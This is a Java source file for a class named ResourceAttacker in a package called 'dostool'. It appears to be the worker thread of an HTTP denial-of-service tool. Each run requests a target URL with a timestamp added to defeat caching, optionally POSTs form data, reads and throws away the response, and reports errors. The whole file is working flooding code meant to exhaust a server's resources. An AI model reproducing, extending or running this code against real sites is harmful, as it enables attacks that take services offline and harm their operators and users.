package com.ehsunbehravesh.dostool;

import com.ehsunbehravesh.dostool.log.LogUtil;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Observable;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ehsun7b
 */
public class ResourceAttacker extends Observable implements Runnable {

  private static final Logger logger = LogUtil.createLogger();
  
  static {
    logger.setLevel(DOSTool.level);
  }
  
  private Resource resource;

  public ResourceAttacker(Resource resource) {
    this.resource = resource;
  }

  public Resource getResource() {
    return resource;
  }

  @Override
  public void run() {
    boolean error = false;
    int bufferSize = 2048 * 10;
    long time1 = System.currentTimeMillis();
    String urlOfResource = resource.getUrl().toString();
    if (urlOfResource.indexOf('#') > 0) {
      urlOfResource = urlOfResource.substring(0, urlOfResource.indexOf('#'));
    }

    if (urlOfResource.indexOf('?') > 0) {
      urlOfResource += "&ts=" + time1;
    } else {
      urlOfResource += "?ts=" + time1;
    }

    HttpURLConnection connection = null;
    try {
      connection = (HttpURLConnection) new URL(urlOfResource).openConnection();
      connection.setUseCaches(false);
    } catch (MalformedURLException ex) {
      logger.log(Level.WARNING, ex.getMessage());
      error = true;
    } catch (IOException ex) {
      logger.log(Level.WARNING, ex.getMessage());
      error = true;
    }

    try {
      if (resource.getType() == Resource.Type.POST) {
        String content = resource.getInputsAsString();

        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setInstanceFollowRedirects(false);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Length", "" + Integer.toString(content.getBytes().length));

        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
        outputStream.writeBytes(content);
        outputStream.flush();
        outputStream.close();
      }
    } catch (Exception ex) {
      logger.log(Level.WARNING, ex.getMessage());
      error = true;
    }

    try {
      if (connection != null) {
        try (InputStream is = connection.getInputStream()) {
          byte[] buffer = new byte[bufferSize];
          int read = -1;
          while ((read = is.read(buffer)) > 0) {
          }
        }
      }
    } catch (Exception ex) {
      logger.log(Level.WARNING, ex.getMessage());
      error = true;
    }
    
    setChanged();
    notifyObservers(error);
  }  
}
